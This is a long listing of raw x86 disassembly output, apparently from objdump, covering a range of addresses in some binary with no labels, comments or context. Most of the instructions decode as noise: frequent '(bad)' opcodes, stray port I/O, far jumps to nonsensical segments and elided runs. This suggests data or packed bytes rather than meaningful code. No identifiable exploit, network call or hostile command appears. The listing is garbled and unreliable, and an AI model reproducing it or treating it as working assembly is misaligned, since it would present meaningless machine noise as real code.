  4164ec:	icebp  
  4164ed:	hlt    
  4164ee:	jae    0x4164e1
  4164f0:	cmc    
  4164f1:	xor    esi,DWORD PTR [ecx]
  4164f3:	pop    esi
  4164f4:	in     al,dx
  4164f5:	and    al,bl
  4164f7:	in     eax,dx
  4164f8:	cmp    eax,0xb83d898e
  4164fd:	sbb    ch,bh
  4164ff:	sar    DWORD PTR ds:0x963e5481,cl
  416505:	pop    esp
  416506:	call   0xfe35b858
  41650b:	pusha  
  41650c:	jbe    0x4164fe
  41650e:	push   0x9b78e6
  416513:	push   ds
  416514:	jbe    0x416572
  416516:	call   0xfe367ea8
  41651b:	push   cs
  41651c:	data16 lock std 
  41651f:	jl     0x416556
  416521:	cld    
  416522:	or     eax,0xc7f58cba
  416527:	sub    eax,DWORD PTR [ecx+0x5b]
  41652a:	push   ebx
  41652b:	bound  eax,QWORD PTR [ecx-0x2b1a3b27]
  416531:	mov    WORD PTR [edx-0x17],gs
  416534:	repz mov ?,ebp
  416537:	pop    esp
  416538:	or     bh,ah
  41653a:	scas   eax,DWORD PTR es:[edi]
  41653b:	sbb    ebp,DWORD PTR [edi-0xb]
  41653e:	xchg   DWORD PTR [esi+ecx*4],ebp
  416541:	loope  0x416576
  416543:	sti    
	...
  41656c:	add    BYTE PTR [eax],al
  41656e:	mov    ch,0x9a
  416570:	add    BYTE PTR [edx+0x39],ah
  416573:	sub    eax,0xdb3a2848
  416578:	cmp    eax,0x689ef1e9
  41657d:	es repz call 0xe920:0x266a3e00
  416586:	cmp    eax,0xbb00c060
  41658b:	jmp    0xfffd:0x4a85e853
  416592:	inc    edi
  416593:	pop    ss
  416594:	(bad)  
  416595:	jmp    DWORD PTR [eax]
  416597:	leave  
  416598:	gs dec esi
  41659a:	ins    BYTE PTR es:[edi],dx
  41659b:	sbb    dh,bh
  41659d:	dec    edi
  41659e:	lock or eax,DWORD PTR [esi]
  4165a1:	call   0x400ee7
  4165a6:	call   DWORD PTR [ecx+0x33]
  4165a9:	inc    DWORD PTR [eax]
  4165ab:	xchg   esi,eax
  4165ac:	add    BYTE PTR [esi-0x19],al
  4165af:	dec    eax
  4165b0:	add    BYTE PTR [ebp+0x2d],dh
  4165b3:	and    edx,edi
  4165b5:	xor    edx,DWORD PTR [edi]
  4165b7:	loopne 0x4165b7
  4165b9:	jmp    DWORD PTR [eax]
  4165bb:	mov    ch,bh
  4165bd:	scas   al,BYTE PTR es:[edi]
  4165be:	pop    edi
  4165bf:	bound  esi,QWORD PTR [ebx-0x45]
  4165c2:	xor    BYTE PTR [edx+edi*8],cl
  4165c5:	jmp    FWORD PTR [edx-0xa6c1a11]
  4165cb:	mov    edi,esi
  4165cd:	pop    edi
  4165ce:	shl    DWORD PTR ds:0x4bf,1
	...
  4165fc:	pop    ss
  4165fd:	stos   BYTE PTR es:[edi],al
  4165fe:	mov    ch,ah
  416600:	xchg   esp,eax
  416601:	mov    ds:0x6b6283f5,eax
  416606:	dec    edx
  416607:	inc    ecx
  416608:	daa    
  416609:	pop    edi
  41660a:	jae    0x416610
  41660c:	ficomp WORD PTR [eax+0x5a7f0005]
  416612:	(bad)  
  416613:	jmp    edi
  416615:	xchg   esi,eax
  416616:	or     BYTE PTR ds:0x45888bb0,dh
  41661c:	mov    bl,0xa3
  41661e:	inc    esp
  41661f:	clc    
  416620:	fistp  DWORD PTR [ebp+0x0]
  416623:	add    BYTE PTR [edx+0x19],dl
  416626:	not    BYTE PTR [eax-0x50]
  416629:	or     edx,edi
  41662b:	(bad)  
  41662c:	ds dec edi
  41662e:	add    bh,bh
  416630:	dec    ebx
  416631:	adc    BYTE PTR [ecx+0x14],dl
  416634:	fisubr DWORD PTR ds:0xe7b0ffc1
  41663a:	dec    ebp
  41663b:	out    0xdd,eax
  41663d:	or     DWORD PTR [edx],eax
  41663f:	add    BYTE PTR [ebp+0x3376046c],bh
  416645:	or     al,0x2
  416647:	add    BYTE PTR [ecx+0x1559d9d2],ah
  41664d:	ret    
  41664e:	add    edi,edi
  416650:	or     esp,DWORD PTR [eax-0x73b98bb0]
  416656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416657:	pop    esp
  416658:	jno    0x41668b
  41665a:	push   eax
  41665b:	je     0x4166c7
  41665d:	pushf  
  41665e:	pushf  
  41665f:	xor    eax,DWORD PTR [eax]
	...
  416689:	add    BYTE PTR [ecx+0x41],ah
  41668c:	cmp    al,cl
  41668e:	inc    esi
  41668f:	add    al,0xb7
  416691:	mov    ah,BYTE PTR [edx-0x7b]
  416694:	inc    ebp
  416695:	sti    
  416696:	aam    0x3
  416698:	fcom   QWORD PTR [ebp+0x41]
  41669b:	(bad)  
  41669c:	stc    
  41669d:	out    0xb,eax
  41669f:	mov    bl,0x50
  4166a1:	inc    bh
  4166a3:	mov    dh,0x4d
  4166a5:	addr16 mov ebp,ebx
  4166a8:	ret    0x20ff
  4166ab:	addr16 stc 
  4166ad:	out    0x90,eax
  4166af:	stc    
  4166b0:	dec    ebp
  4166b1:	(bad)  
  4166b2:	adc    DWORD PTR [edi-0x36c01b0],eax
  4166b8:	pop    ecx
  4166b9:	test   DWORD PTR [edi+0x21],0xfffcc84e
  4166c0:	add    DWORD PTR [ebp-0x3b],edx
  4166c3:	pop    ds
  4166c4:	add    bl,0xea
  4166c7:	popf   
  4166c8:	add    al,0x6a
  4166ca:	mov    ecx,eax
  4166cc:	xlat   BYTE PTR ds:[ebx]
  4166cd:	pop    es
  4166ce:	out    0x5a,al
  4166d0:	adc    DWORD PTR ds:0xc970f1d1,0xffffffc5
  4166d7:	and    bh,0x3
  4166da:	shl    DWORD PTR [eax-0x63db7a01],1
  4166e0:	out    0xdb,eax
  4166e2:	into   
  4166e3:	test   DWORD PTR [eax],ebp
  4166e5:	add    al,0xa9
  4166e7:	fistp  WORD PTR [bp+di-0x48]
  4166eb:	(bad)  
  4166ec:	outs   dx,BYTE PTR ds:[esi]
  4166ed:	dec    edi
	...
  416716:	add    BYTE PTR [eax],al
  416718:	cwde   
  416719:	arpl   WORD PTR [bx+0xa],cx
  41671d:	arpl   WORD PTR [edi-0x6f],cx
  416720:	dec    esi
  416721:	repnz push esi
  416723:	cmp    eax,0xb8e7567f
  416728:	(bad)  
  416729:	(bad)  
  41672a:	push   0x48
  41672c:	lea    ecx,[eax+0x5ef24e96]
  416732:	aas    
  416733:	cld    
  416734:	es repnz cs sti 
  416738:	cdq    
  416739:	addr16 in eax,dx
  41673b:	scas   al,BYTE PTR es:[edi]
  41673c:	repz and ebp,DWORD PTR [edx]
  41673f:	cld    
  416740:	dec    ecx
  416741:	fisubr WORD PTR [ebx+edx*2-0x6b0e0f]
  416748:	and    DWORD PTR [ebx+0x65304ec0],esi
  41674e:	daa    
  41674f:	(bad)  
  416750:	mov    ebp,0x3e03e894
  416755:	lock je 0x4167a7
  416758:	enter  0xc396,0x34
  41675c:	mov    ds:0xe5d8df0f,al
  416761:	lock pop esp
  416763:	dec    esp
  416764:	sbb    DWORD PTR [edx],edx
  416766:	sub    ecx,DWORD PTR [edi-0x8]
  416769:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41676b:	xlat   BYTE PTR ds:[ebx]
  41676c:	cmp    dl,ah
  41676e:	and    al,0x60
  416770:	mov    ah,0xeb
  416772:	add    dl,al
  416774:	shl    ecx,1
  416776:	jae    0x416725
  416778:	jne    0x416769
  41677a:	xor    DWORD PTR [esi+0x0],esp
	...
  4167a4:	add    BYTE PTR [eax],al
  4167a6:	and    bl,0x43
  4167a9:	lea    edi,[eax+0x67]
  4167ac:	cld    
  4167ad:	xchg   esi,eax
  4167ae:	out    0x4,al
  4167b0:	(bad)  
  4167b1:	adc    al,0xa
  4167b3:	clc    
  4167b4:	and    DWORD PTR [ebp-0xb760f00],edi
  4167ba:	or     DWORD PTR [ebx],eax
  4167bc:	loope  0x4167a7
  4167be:	cmp    eax,0x74abbd5b
  4167c3:	fwait
  4167c4:	add    BYTE PTR [esi+0x945f8cb],bh
  4167ca:	inc    edx
  4167cb:	pop    ebx
  4167cc:	or     DWORD PTR [ecx],ebp
  4167ce:	imul   ebx,DWORD PTR [edx-0x17],0xc02d09fa
  4167d5:	add    BYTE PTR [eax],0xf1
  4167d8:	std    
  4167d9:	movsx  edi,BYTE PTR ds:[eax]
  4167dd:	out    dx,al
  4167de:	xchg   bh,dh
  4167e0:	out    0x21,eax
  4167e2:	cmp    eax,0xed72005b
  4167e7:	ja     0x4167a4
  4167e9:	xchg   edx,eax
  4167ea:	xor    al,0x53
  4167ed:	add    DWORD PTR [eax+0x50],eax
  4167f0:	add    cl,ch
  4167f2:	xor    al,0xb0
  4167f4:	jae    0x4167e2
  4167f6:	xchg   edx,eax
  4167f7:	stos   BYTE PTR es:[edi],al
  4167f8:	add    cl,ch
  4167fa:	cmp    eax,0xa5f9899b
  4167ff:	addr16 call 0x3fc63086
  416805:	jmp    0x9475fd5
	...
  416832:	add    BYTE PTR [eax],al
  416834:	inc    edx
  416835:	pop    ebx
  416836:	or     DWORD PTR [ecx+0x71e756e9],ebp
  41683c:	inc    edx
  41683d:	pop    ebx
  41683e:	add    BYTE PTR [eax],al
  416840:	ins    DWORD PTR es:[edi],dx
  416841:	out    0xc3,eax
  416843:	add    bh,dl
  416845:	stos   DWORD PTR es:[edi],eax
  416846:	dec    edi
  416847:	jmp    DWORD PTR [edx]
  416849:	(bad)  
  41684a:	in     eax,0x3f
  41684c:	or     DWORD PTR [eax+eax*1+0xb],ebx
  416850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416851:	adc    dh,BYTE PTR [edx-0x77]
  416854:	and    al,BYTE PTR [ebx-0x71408a02]
  41685a:	sbb    eax,DWORD PTR [ebx-0x38]
  41685d:	popf   
  41685e:	mov    BYTE PTR [ebp-0x39],al
  416861:	popf   
  416862:	je     0x416848
  416864:	sub    BYTE PTR [eax],cl
  416866:	fsubp  st(0),st
  416868:	xchg   edi,eax
  416869:	pop    ss
  41686a:	(bad)  
  41686b:	call   FWORD PTR [ebx+ebx*4+0x10564f71]
  416872:	loop   0x416873
  416874:	xor    cl,al
  416876:	push   0x41
  416878:	xchg   edi,eax
  416879:	outs   dx,BYTE PTR ds:[esi]
  41687a:	inc    esp
  41687b:	fmul   DWORD PTR [eax]
  41687d:	dec    eax
  41687e:	mov    bh,0x6b
  416880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416881:	pop    ebx
  416882:	lea    eax,[ebp+0x53]
  416885:	jo     0x4168cb
  416887:	aam    0xc7
  416889:	jo     0x4168cf
  41688b:	in     al,0xb7
  41688d:	sahf   
  41688e:	je     0x416870
  416890:	das    
  416891:	mov    bh,0x59
  416893:	jmp    FWORD PTR [eax]
  416895:	repnz mov ebp,0x74
	...
  4168bf:	add    BYTE PTR [eax],al
  4168c1:	add    BYTE PTR [ecx+0x13],dh
  4168c4:	add    DWORD PTR [eax],eax
  4168c6:	cmp    cl,ah
  4168c8:	(bad)  
  4168c9:	jne    0x4168fa
  4168cb:	xchg   ebx,eax
  4168cc:	ret    0x282f
  4168cf:	mov    al,ds:0xa03f75fe
  4168d4:	je     0x4168de
  4168d6:	aas    
  4168d7:	add    DWORD PTR [esi],ebp
  4168d9:	call   FWORD PTR [eax]
  4168db:	mov    al,ds:0x5e8e474
  4168e0:	fdivp  st(7),st
  4168e2:	ds (bad) 
  4168e4:	cld    
  4168e5:	out    0xde,eax
  4168e7:	in     eax,dx
  4168e8:	dec    esp
  4168e9:	(bad)  
  4168ea:	icebp  
  4168eb:	das    
  4168ec:	fs out 0xef,eax
  4168ef:	repnz dec esp
  4168f1:	inc    BYTE PTR [esp+ecx*2-0x59baf084]
  4168f8:	aad    0x8
  4168fa:	mov    esi,0xc30f01f6
  4168ff:	icebp  
  416900:	dec    esp
  416901:	inc    cl
  416903:	pop    esp
  416904:	add    al,BYTE PTR [eax]
  416906:	test   eax,0x46744c9e
  41690b:	int3   
  41690c:	test   DWORD PTR [esi],ebp
  41690e:	test   eax,0xa2744c6d
  416913:	gs (bad) 
  416915:	neg    DWORD PTR [ecx-0x1d180619]
  41691b:	inc    ebp
  41691c:	dec    ebx
  41691d:	dec    BYTE PTR [ecx-0x3c18a1f9]
  416923:	push   edx
  416924:	dec    ebx
  416925:	inc    BYTE PTR [eax]
	...
  41694f:	add    bl,cl
  416951:	mov    bh,0x51
  416953:	dec    edi
  416954:	data16 mov BYTE PTR [ecx],cl
  416957:	jmp    FWORD PTR [ecx-0x77]
  41695a:	add    DWORD PTR [edi+0x0],ebx
  41695d:	cmp    edi,DWORD PTR [edi]
  41695f:	pop    es
  416960:	ds (bad) 
  416962:	js     0x41694f
  416964:	push   ecx
  416965:	iret   
  416966:	std    
  416967:	(bad)  
  416968:	shr    ebx,cl
  41696a:	pop    ecx
  41696b:	bound  eax,QWORD PTR [eax+0x45]
  41696e:	dec    esp
  41696f:	enter  0xffc,0x2
  416973:	push   ebp
  416974:	lds    eax,FWORD PTR [edi+0x4c]
  416977:	je     0x4169b3
  416979:	dec    esp
  41697a:	fs xor eax,0xbff5e521
  416980:	xchg   edx,eax
  416981:	and    DWORD PTR [ebp+0x74],ecx
  416984:	cs pop ebx
  416986:	aaa    
  416987:	pop    esp
  416988:	xchg   edx,eax
  416989:	and    eax,0x83714bde
  41698e:	(bad)  [ecx+0x39]
  416991:	pop    ebx
  416992:	into   
  416993:	ror    DWORD PTR [ecx-0x12],1
  416996:	cmp    al,0xf0
  416998:	jns    0x416988
  41699a:	xor    al,0xfc
  41699c:	fldenv [esi+0x2d84b10]
  4169a2:	inc    eax
  4169a3:	push   ss
  4169a4:	shr    ebp,1
  4169a6:	mov    al,0x46
  4169a8:	sub    eax,0xd57f345b
  4169ad:	and    bh,0x3
  4169b0:	test   eax,0xa0ffac
	...
  4169dd:	add    BYTE PTR [esp+ebx*4],ah
  4169e0:	out    0x4a,eax
  4169e2:	xor    bl,BYTE PTR [edi+0x11]
  4169e5:	out    dx,al
  4169e6:	mov    al,ds:0xe95bdf67
  4169eb:	in     eax,dx
  4169ec:	outs   dx,BYTE PTR ds:[esi]
  4169ed:	dec    ebx
  4169ee:	sbb    DWORD PTR [ebx-0x19],ebx
  4169f1:	pop    edx
  4169f2:	retf   
  4169f3:	add    BYTE PTR [edi+ebx*8-0x2ea9a502],0x45
  4169fb:	sub    ebx,0x4f62ea4a
  416a01:	ins    DWORD PTR es:[edi],dx
  416a02:	push   0x61dc3eed
  416a07:	in     eax,dx
  416a08:	inc    esi
  416a09:	mov    ah,cl
  416a0b:	mov    bh,0xc2
  416a0d:	les    edx,FWORD PTR [ecx-0x14]
  416a10:	pushf  
  416a11:	not    edi
  416a13:	cmp    DWORD PTR [esi],ebx
  416a15:	sar    DWORD PTR [ecx],1
  416a17:	add    ebp,DWORD PTR [edx+0x4b]
  416a1a:	cmp    ch,ch
  416a1c:	and    BYTE PTR [esi+0x39],al
  416a1f:	pop    ebx
  416a20:	pushf  
  416a21:	jle    0x416a38
  416a23:	test   BYTE PTR [eax-0x21],al
  416a26:	jle    0x416a83
  416a28:	add    BYTE PTR [ecx-0x16c07e53],al
  416a2e:	test   BYTE PTR [edi+0x10],ah
  416a31:	out    0x2e,al
  416a33:	mov    ebp,0x33a2848
  416a38:	adc    al,0x1c
  416a3a:	test   ebp,ebp
  416a3c:	or     DWORD PTR [ecx+0x7ca15201],ebp
	...
  416a6a:	add    BYTE PTR [eax],al
  416a6c:	or     BYTE PTR [eax+eax*1-0x29ef142],bl
  416a73:	cmp    al,0xda
  416a75:	hlt    
  416a76:	sub    DWORD PTR [esi-0x2302127c],0xffffffae
  416a7d:	cmp    DWORD PTR [edi],0x300e65e9
  416a83:	xchg   esi,eax
  416a84:	add    al,0x23
  416a86:	ret    
  416a87:	fnstsw WORD PTR ds:0xc0958986
  416a8d:	sbb    ch,bh
  416a8f:	adc    edi,DWORD PTR [edx]
  416a91:	adc    DWORD PTR [edi+0x76],0xe9e8546e
  416a98:	xor    al,0xec
  416a9a:	std    
  416a9b:	jo     0x416b1b
  416a9d:	lock push 0x9b6605
  416aa3:	sar    DWORD PTR [edi+edi*2],0x3f
  416aa7:	jmp    0x5149d1b0
  416aac:	fsubr  st,st(4)
  416aae:	std    
  416aaf:	ds hlt 
  416ab1:	data16 cld 
  416ab3:	outs   dx,BYTE PTR ss:[esi]
  416ab5:	push   esp
  416ab6:	call   0xfe2d9fc2
  416abb:	xor    BYTE PTR [ebx],al
  416abd:	pop    eax
  416abe:	add    BYTE PTR [eax+eax*8-0x7ed27e01],dh
  416ac5:	add    BYTE PTR [eax],0x83
  416ac8:	in     eax,0xec
  416aca:	jae    0x416acc
  416acc:	das    
  416acd:	nop
  416ace:	(bad)  
  416acf:	add    BYTE PTR cs:[eax],al
	...
  416afa:	and    BYTE PTR [edx+0x11134588],ah
  416b00:	popa   
  416b01:	ins    BYTE PTR es:[edi],dx
  416b02:	out    0x57,al
  416b04:	push   0xfe187349
  416b09:	(bad)  
  416b0a:	push   0xffffffef
  416b0c:	in     eax,0x65
  416b0e:	adc    BYTE PTR [edx-0x5c750002],ah
  416b14:	(bad)  
  416b15:	jne    0x416b06
  416b17:	(bad)  
  416b18:	in     eax,dx
  416b19:	mov    al,cs:0xebc2c8a1
  416b1f:	push   edi
  416b20:	push   ebx
  416b21:	mov    edx,DWORD PTR [ebx+0x2dfcc1d5]
  416b27:	push   edi
  416b28:	push   0x5a
  416b2a:	mov    al,ds:0x3be8061b
  416b2f:	push   ecx
  416b30:	std    
  416b31:	call   FWORD PTR [esi]
  416b33:	lods   al,BYTE PTR ds:[esi]
  416b34:	stc    
  416b35:	push   0xffffff97
  416b37:	setl   BYTE PTR [esi+edx*2+0x57]
  416b3c:	push   0xfe184381
  416b41:	dec    dl
  416b43:	rol    DWORD PTR [ebp+0x41],1
  416b46:	xchg   edi,eax
  416b47:	(bad)  
  416b48:	push   edi
  416b49:	xor    al,0xe0
  416b4b:	mov    eax,ds:0x9bc00a
  416b50:	dec    esi
  416b51:	push   0xbeed5767
  416b56:	(bad)
  416b5a:	push   edi
  416b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5c:	(bad)  
  416b5d:	jne    0x416b5f
	...
  416b87:	add    BYTE PTR [edi-0x71],bl
  416b8a:	sbb    DWORD PTR [edx+0x20],ebx
  416b8d:	mov    ds:0xa26625e5,al
  416b92:	(bad)  
  416b93:	push   0x57
  416b95:	setl   BYTE PTR [esi+edi*1-0x4d]
  416b9a:	add    DWORD PTR [eax-0x41],ebp
  416b9d:	push   0xf6a1ffc2
  416ba2:	add    DWORD PTR [eax],eax
  416ba4:	mov    esi,0x19341f4c
  416ba9:	repnz cld 
  416bab:	mov    edi,0x67b20b8a
  416bb0:	ds hlt 
  416bb2:	pop    eax
  416bb3:	mov    ebp,0x40d5c396
  416bb8:	ds and al,0x47
  416bbb:	je     0x416c03
  416bbd:	sbb    al,0x5b
  416bbf:	pop    eax
  416bc0:	jmp    0x2f32c5e6
  416bc5:	test   eax,0x9c3e6948
  416bca:	mov    ds:0xd9f47f6b,al
  416bcf:	sbb    BYTE PTR [edx+0x33],0x4
  416bd3:	dec    DWORD PTR [ebx]
  416bd5:	call   0x3254:0xdc3e40b9
  416bdc:	mov    cl,0xd9
  416bde:	cld    
  416bdf:	mov    edi,0x67b1fb32
  416be4:	ds hlt 
  416be6:	pop    eax
  416be7:	mov    ebp,0x40d52326
	...
  416c14:	add    BYTE PTR [eax],al
  416c16:	ds inc esp
  416c18:	inc    edi
  416c19:	je     0x416c51
  416c1b:	mov    WORD PTR [esi+0x59898158],cs
  416c21:	mov    ebp,0x6948912e
  416c26:	ds sbb al,0xa0
  416c29:	imul   edi,edi,0xfffffff3
  416c2c:	fld    DWORD PTR [eax+0x6801b2d2]
  416c32:	cmp    al,0xf4
  416c34:	add    DWORD PTR [eax-0xebcb9a],eax
  416c3a:	dec    ecx
  416c3b:	pop    ebx
  416c3c:	repnz inc ebx
  416c3e:	int    0x43
  416c40:	mov    bh,0xdb
  416c42:	cmp    edx,ebp
  416c44:	push   es
  416c45:	mov    DWORD PTR [ecx+0x29c27bac],ebx
  416c4b:	call   0xaa69:0xf339ce06
  416c52:	sbb    dl,ch
  416c54:	(bad)  
  416c55:	jnp    0x416cb8
  416c57:	jmp    0xd1e6:0xe79247ee
  416c5e:	cmp    ebx,esi
  416c60:	fstp   QWORD PTR [ecx]
  416c62:	stc    
  416c63:	jmp    0x5b7eaf08
  416c68:	xor    al,0x7b
  416c6a:	aad    0xdb
  416c6c:	stos   DWORD PTR es:[edi],eax
  416c6d:	pop    esp
  416c6e:	call   0x431e2b5c
  416c73:	pop    esp
  416c74:	out    0x3,eax
  416c76:	out    0xda,al
  416c78:	test   DWORD PTR [esi+0x0],0x0
	...
  416ca3:	add    al,cl
  416ca5:	shr    DWORD PTR [esp+ebx*2-0x38],cl
  416ca9:	jmp    0xe743e64c
  416cae:	aaa    
  416caf:	inc    edi
  416cb0:	sub    dl,BYTE PTR [edi-0x72]
  416cb3:	rol    DWORD PTR [ecx-0xd],1
  416cb6:	ins    DWORD PTR es:[edi],dx
  416cb7:	call   0x4434565d
  416cbc:	dec    eax
  416cbd:	loopne 0x416ca1
  416cbf:	add    al,0x3e
  416cc1:	pop    ebx
  416cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cc3:	rcl    DWORD PTR [ecx+0x3e03e75a],0x22
  416cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ccb:	dec    edi
  416ccc:	js     0x416d2f
  416cce:	out    0x3,eax
  416cd0:	in     al,0x5a
  416cd2:	rol    DWORD PTR [ebx],0xd4
  416cd5:	pop    edx
  416cd6:	rol    DWORD PTR [ebx],1
  416cd8:	mov    bl,0x9f
  416cda:	xor    esi,DWORD PTR [edx+ecx*8+0x13d00df]
  416ce1:	jmp    0x6f4206e3
  416ce6:	clc    
  416ce7:	outs   dx,DWORD PTR es:[esi]
  416ce9:	in     eax,0xe8
  416ceb:	shl    DWORD PTR [ecx],0xe9
  416cee:	std    
  416cef:	loop   0x416d6e
  416cf1:	ins    BYTE PTR es:[edi],dx
  416cf2:	add    eax,DWORD PTR [eax]
  416cf4:	jo     0x416cde
  416cf6:	std    
  416cf7:	jmp    0xa88a4001
  416cfc:	cmp    eax,0x75e573e8
  416d01:	mov    bl,0x31
  416d03:	out    dx,al
  416d04:	sbb    BYTE PTR [eax+0xb989],0x0
	...
  416d2f:	add    BYTE PTR [eax],al
  416d31:	add    BYTE PTR [esi-0x7f290b21],al
  416d37:	jmp    0xc3d3a88c
  416d3c:	xor    esi,ecx
  416d3e:	adc    bl,0x83
  416d41:	mov    ecx,0xd1fde970
  416d46:	jo     0x416d81
  416d48:	std    
  416d49:	mov    dh,0xf7
  416d4b:	call   0x9c3303b5
  416d50:	add    BYTE PTR [esi-0x610a0752],ah
  416d56:	add    cl,ch
  416d58:	jae    0x416d3b
  416d5a:	adc    eax,0x8e32ea
  416d5f:	rol    DWORD PTR [ebx-0x2170f6b],cl
  416d65:	push   0xffffffc6
  416d67:	hlt    
  416d68:	cmc    
  416d69:	jbe    0x416d63
  416d6b:	out    0x71,eax
  416d6d:	sbb    ch,BYTE PTR [edx+0x4]
  416d70:	ins    DWORD PTR es:[edi],dx
  416d71:	test   al,0x3d
  416d73:	call   0xe949bb2b
  416d78:	std    
  416d79:	inc    ecx
  416d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d7b:	sub    eax,0x98ad4efd
  416d80:	push   0x5f5300
  416d85:	add    BYTE PTR [eax],bl
  416d87:	retf   
  416d88:	in     eax,0xf7
  416d8a:	or     BYTE PTR [ecx+0x1f9f8c65],ah
  416d90:	(bad)  
  416d91:	and    edx,DWORD PTR [bx+si]
  416d94:	inc    ecx
	...
  416dbd:	add    BYTE PTR [eax],al
  416dbf:	add    bh,cl
  416dc1:	(bad)
  416dc5:	test   BYTE PTR [edi],bh
  416dc7:	sbb    edx,DWORD PTR [edi]
  416dc9:	pop    esp
  416dca:	cmp    eax,0x68161614
  416dd0:	daa    
  416dd1:	pop    esp
  416dd2:	in     eax,dx
  416dd3:	mov    esi,0x416992bf
  416dd8:	pop    ss
  416dd9:	mov    eax,ds:0x9de0e8b4
  416dde:	(bad)  
  416ddf:	call   DWORD PTR [edx+0x2f6fe5ef]
  416de5:	sahf   
  416de6:	(bad)  
  416de7:	call   0x3ebc7b
  416dec:	clc    
  416ded:	pop    ss
  416dee:	push   cs
  416def:	call   DWORD PTR [edx-0x71]
  416df2:	idiv   bh
  416df4:	mov    BYTE PTR [ebp-0x7e00f78c],bl
  416dfa:	sti    
  416dfb:	call   FWORD PTR [eax-0x2f0f4b63]
  416e01:	popf   
  416e02:	(bad)  
  416e03:	call   0x3ebc73
  416e08:	mov    eax,0xb8f7e9d7
  416e0d:	popf   
  416e0e:	in     eax,0x51
  416e10:	mov    BYTE PTR [esi-0x689d0002],bl
  416e16:	call   0xfedf861f
  416e1b:	jmp    DWORD PTR [edx-0x61]
  416e1e:	in     eax,0x6d
  416e20:	cmp    al,0x5f
  416e22:	add    bh,bh
	...
  416e4c:	add    BYTE PTR [eax],al
  416e4e:	ds (bad) 
  416e50:	pop    esp
  416e51:	imul   BYTE PTR [ecx-0x68]
  416e54:	pop    esp
  416e55:	xor    eax,0xc843a111
  416e5a:	jl     0x416e51
  416e5c:	add    DWORD PTR [ebp-0x3b],edx
  416e5f:	popf   
  416e60:	jg     0x416e25
  416e62:	dec    edx
  416e63:	sbb    eax,DWORD PTR [edx]
  416e65:	push   0xffffffe5
  416e67:	inc    eax
  416e68:	int    0x7
  416e6a:	es sbb eax,0x7c31ff16
  416e70:	mov    ebp,0xf9d029fb
  416e75:	jcxz   0x416e48
  416e78:	ret    0x18ff
  416e7b:	mov    al,0x93
  416e7d:	inc    edi
  416e7e:	jg     0x416e74
  416e80:	pop    ecx
  416e81:	lea    ecx,[eax]
  416e83:	test   BYTE PTR [esi+edi*8-0x75],0xec
  416e88:	fnstcw WORD PTR [edx+ebp*2+0x3c680433]
  416e8f:	hlt    
  416e90:	add    DWORD PTR [eax-0x1b9672a],eax
  416e96:	loope  0x416e24
  416e98:	add    al,0x0
  416e9a:	jmp    0x633e4805
  416e9f:	xor    eax,DWORD PTR [eax+ebp*2]
  416ea2:	xor    al,0x27
  416ea4:	sar    edi,0xc0
  416ea7:	inc    edi
  416ea8:	cld    
  416ea9:	out    0x58,eax
  416eab:	pushf  
  416eac:	inc    ebx
  416ead:	(bad)  
  416eae:	mov    cl,0x47
  416eb0:	dec    eax
  416eb1:	inc    BYTE PTR [eax]
	...
  416edb:	add    BYTE PTR [ebx],dh
  416edd:	cld    
  416ede:	pop    ecx
  416edf:	push   ebx
  416ee0:	push   edx
  416ee1:	fld    QWORD PTR [eax+ecx*8+0x7c]
  416ee5:	add    BYTE PTR [edx],al
  416ee7:	push   ebp
  416ee8:	(bad)
  416eeb:	ret    
  416eec:	(bad)  
  416eed:	ins    DWORD PTR es:[edi],dx
  416eee:	inc    esp
  416eef:	(bad)  
  416ef0:	mov    bl,0x5b
  416ef2:	lods   al,BYTE PTR ds:[esi]
  416ef3:	inc    edi
  416ef4:	or     esi,esp
  416ef6:	aam    0xf7
  416ef8:	jo     0x416f6a
  416efa:	fistp  WORD PTR [ebx+0x55]
  416efd:	inc    ecx
  416efe:	out    0x3,eax
  416f00:	xor    eax,0x607ef71b
  416f05:	pop    ecx
  416f06:	out    0x3,eax
  416f08:	jns    0x416eaa
  416f0a:	das    
  416f0b:	add    edi,DWORD PTR [esi]
  416f0d:	pop    ebx
  416f0e:	out    0x3c,eax
  416f10:	cli    
  416f11:	out    dx,al
  416f12:	es cld 
  416f14:	cmp    esi,esp
  416f16:	xchg   ecx,eax
  416f17:	add    esp,DWORD PTR [ebx+ebx*2+0x5b940381]
  416f1e:	pop    esp
  416f1f:	mov    esi,0x7e748b2d
  416f24:	or     eax,0x8143feee
  416f29:	out    0x7c,al
  416f2b:	dec    ebx
  416f2c:	or     BYTE PTR [eax-0x15],dh
  416f2f:	pop    edx
  416f30:	ret    
  416f31:	inc    eax
  416f32:	out    0x3,eax
  416f34:	inc    ebp
  416f35:	sbb    edx,DWORD PTR [ecx+ecx*1-0x19]
  416f39:	mov    al,0xe9
  416f3b:	add    edi,DWORD PTR [esi]
  416f3d:	jae    0x416fa0
  416f3f:	int3   
	...
  416f68:	add    BYTE PTR [eax],al
  416f6a:	jle    0x416fc7
  416f6c:	(bad)  
  416f6d:	mov    ecx,0xf5eef345
  416f72:	shl    ch,1
  416f74:	bound  edx,QWORD PTR [edx+edi*4-0x21]
  416f78:	mov    bl,0x3b
  416f7a:	shl    ch,0x37
  416f7d:	(bad)  
  416f7e:	mov    eax,ds:0xb042d98e
  416f83:	shr    DWORD PTR [esp+esi*1-0x50],cl
  416f87:	in     eax,0x8e
  416f89:	scas   al,BYTE PTR es:[edi]
  416f8a:	mov    eax,ds:0xfeb0d07d
  416f8f:	pop    edx
  416f90:	jle    0x41700b
  416f92:	mov    eax,ds:0xfd7600ed
  416f97:	in     al,0x73
  416f99:	loope  0x416ff0
  416f9b:	mov    BYTE PTR [edi],ch
  416f9d:	data16 std 
  416f9f:	rol    BYTE PTR [ebx-0x21acab3],cl
  416fa5:	ret    
  416fa6:	cmp    eax,0x7abc3673
  416fab:	in     eax,0xfe
  416fad:	jl     0x416fc1
  416faf:	in     eax,dx
  416fb0:	std    
  416fb1:	ds std 
  416fb3:	outs   dx,BYTE PTR ds:[esi]
  416fb4:	or     BYTE PTR [ecx-0x7f],al
  416fb7:	sub    bh,ch
  416fb9:	cs mov bl,0xde
  416fbc:	call   0x6b26ecdf
